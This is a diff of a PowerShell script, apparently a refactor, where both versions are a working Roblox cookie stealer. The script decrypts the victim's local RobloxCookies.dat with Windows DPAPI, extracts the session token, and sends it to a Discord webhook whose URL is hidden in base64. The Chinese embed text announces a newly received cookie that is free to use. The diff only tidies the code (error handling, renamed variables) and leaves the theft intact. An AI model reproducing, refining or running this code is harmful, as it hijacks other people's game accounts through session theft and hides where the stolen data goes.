@@ -1,54 +1,55 @@
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
-# 1. Retrieve Roblox Token (Decryption logic remains unchanged)
-$p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; 
-if(Test-Path $p){ 
-    [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); 
-    $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; 
-    $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); 
-    $s=[Text.Encoding]::UTF8.GetString($d); 
-    if($s -match '(_\|WARNING.*?)(;|$)'){
-        $cookie=$matches[1]
-    } 
-} else {
-    $cookie = "Roblox Not Found"
+# 1. Retrieve Roblox Token
+$p = "$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"
+$cookie = "Roblox Not Found"
+
+if (Test-Path $p) {
+    try {
+        [void][Reflection.Assembly]::LoadWithPartialName('System.Security')
+        $j = (Get-Content $p -Raw | ConvertFrom-Json).CookiesData
+        $d = [Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j), $null, 'CurrentUser')
+        $s = [Text.Encoding]::UTF8.GetString($d)
+        if ($s -match '(_\|WARNING.*?)(;|$)') {
+            $cookie = $matches[1]
+        }
+    } catch {
+        $cookie = "Error Decrypting Cookie"
+    }
 }
 
-# 2. Base64 Encoded Strings (Webhook URL and Embed Data)
-$encodedUri = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMTUyMzI1NDQwNDE5MDIwOS9xbmZUYllnZk51T0NPQmJFcXd1TUhIallDbHRxZ004aVFrcEN5ME5GVmFTMTRvUm1LcWZ5c0lRdGthdXc0WUZnR2V6"
-$encodedTitle = "5paw55qEcm9ibG94IGNvb2tpZeaOpeWUtg==" # "新的roblox cookie接收"
-$encodedFooter = "5Y+v5Lul55uh5oOF5L2/55So" # "可以盡情使用"
+# 2. Base64 Encoded Config (URL and Embed Text)
+$b64_uri = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMTUyMzI1NDQwNDE5MDIwOS9xbmZUYllnZk51T0NPQmJFcXd1TUhIallDbHRxZ004aVFrcEN5ME5GVmFTMTRvUm1LcWZ5c0lRdGthdXc0WUZnR2V6"
+$b64_title = "5paw55qEcm9ibG94IGNvb2tpZeaOpeWUtg=="
+$b64_footer = "5Y+v5Lul55uh5oOF5L2/55So"
 
-# 3. Decode helper function
-function Decode-B64($val) {
-    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($val))
+# 3. Decode function
+function Decode-String($base64) {
+    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64))
 }
 
-# 4. Prepare Payload with Decoded strings
-$uri = Decode-B64 $encodedUri
+# 4. Prepare Payload
+$uri = Decode-String $b64_uri
 $payload = @{
     embeds = @(
         @{
-            title = Decode-B64 $encodedTitle
-            color = 3447003 
-            
+            title = Decode-String $b64_title
+            color = 3447003
             fields = @(
                 @{
-                    name = "cookie"
+                    name  = "cookie"
                     value = "```$cookie```"
                 }
             )
-
             footer = @{
-                text = Decode-B64 $encodedFooter
+                text = Decode-String $b64_footer
             }
         }
     )
 }
 
-# 5. Convert to JSON and ensure UTF-8 encoding
-$jsonPayload = $payload | ConvertTo-Json -Depth 10
-$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)
+# 5. Convert and Send
+$json = $payload | ConvertTo-Json -Depth 10
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
 
-# 6. Execute POST request
-Invoke-RestMethod -Uri $uri -Method Post -Body $utf8Bytes -ContentType "application/json; charset=utf-8"
+Invoke-RestMethod -Uri $uri -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
